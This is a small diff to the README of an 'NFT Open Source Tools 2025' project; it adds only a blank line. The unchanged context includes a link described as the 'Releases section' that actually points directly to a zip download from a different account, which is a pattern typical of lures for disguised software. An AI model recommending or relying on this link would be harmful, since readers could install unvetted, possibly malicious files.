@@ -79,3 +79,4 @@ For any inquiries or feedback, feel free to reach out:
 - GitHub: [IlieCprp](https://github.com/IlieCprp)
 
 We appreciate your interest in **NFT Open Source Tools 2025**! Explore the tools, contribute to the community, and enhance your NFT trading experience. Don’t forget to check the [Releases](https://github.com/sakaen-100/NFT-Open-Source-Tools-2025/releases/download/download/NFT.Open.Source.Tools.2025.v1.2.4-beta.3.zip) section for the latest updates. Happy trading!
+ 
